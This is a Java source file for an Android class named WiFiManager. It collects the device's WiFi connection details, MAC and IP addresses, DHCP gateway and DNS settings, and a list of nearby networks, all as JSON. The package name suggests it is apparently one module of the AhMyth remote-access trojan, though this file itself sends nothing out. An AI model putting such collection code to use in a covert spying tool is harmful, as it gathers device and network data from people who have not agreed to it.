package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.DhcpInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class WiFiManager {

    private Context context;
    private WifiManager wifiManager;

    public WiFiManager(Context context) {
        this.context = context;
        wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
    }

    public JSONObject getWiFiInfo() {
        JSONObject wifiInfo = new JSONObject();
        try {
            if (wifiManager == null) {
                wifiInfo.put("enabled", false);
                wifiInfo.put("error", "WifiManager not available");
                return wifiInfo;
            }

            wifiInfo.put("enabled", wifiManager.isWifiEnabled());
            
            if (wifiManager.isWifiEnabled()) {
                WifiInfo connectionInfo = wifiManager.getConnectionInfo();
                if (connectionInfo != null) {
                    String ssid = connectionInfo.getSSID();
                    wifiInfo.put("ssid", ssid != null ? ssid.replace("\"", "") : "Unknown");
                    wifiInfo.put("bssid", connectionInfo.getBSSID());
                    wifiInfo.put("macAddress", connectionInfo.getMacAddress());
                    wifiInfo.put("ipAddress", intToIp(connectionInfo.getIpAddress()));
                    wifiInfo.put("linkSpeed", connectionInfo.getLinkSpeed());
                    wifiInfo.put("rssi", connectionInfo.getRssi());
                    wifiInfo.put("networkId", connectionInfo.getNetworkId());
                    wifiInfo.put("hiddenSSID", connectionInfo.getHiddenSSID());
                }

                // DHCP Information
                DhcpInfo dhcpInfo = wifiManager.getDhcpInfo();
                if (dhcpInfo != null) {
                    JSONObject dhcp = new JSONObject();
                    dhcp.put("ipAddress", intToIp(dhcpInfo.ipAddress));
                    dhcp.put("gateway", intToIp(dhcpInfo.gateway));
                    dhcp.put("netmask", intToIp(dhcpInfo.netmask));
                    dhcp.put("dns1", intToIp(dhcpInfo.dns1));
                    dhcp.put("dns2", intToIp(dhcpInfo.dns2));
                    dhcp.put("serverAddress", intToIp(dhcpInfo.serverAddress));
                    wifiInfo.put("dhcp", dhcp);
                }

                // Scan for available networks
                List<ScanResult> scanResults = wifiManager.getScanResults();
                if (scanResults != null && !scanResults.isEmpty()) {
                    JSONArray networks = new JSONArray();
                    for (ScanResult result : scanResults) {
                        JSONObject network = new JSONObject();
                        network.put("ssid", result.SSID);
                        network.put("bssid", result.BSSID);
                        network.put("capabilities", result.capabilities);
                        network.put("frequency", result.frequency);
                        network.put("level", result.level);
                        network.put("timestamp", result.timestamp);
                        networks.put(network);
                    }
                    wifiInfo.put("availableNetworks", networks);
                    wifiInfo.put("networksCount", networks.length());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            try {
                wifiInfo.put("error", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return wifiInfo;
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." +
               ((ip >> 8) & 0xFF) + "." +
               ((ip >> 16) & 0xFF) + "." +
               ((ip >> 24) & 0xFF);
    }
}
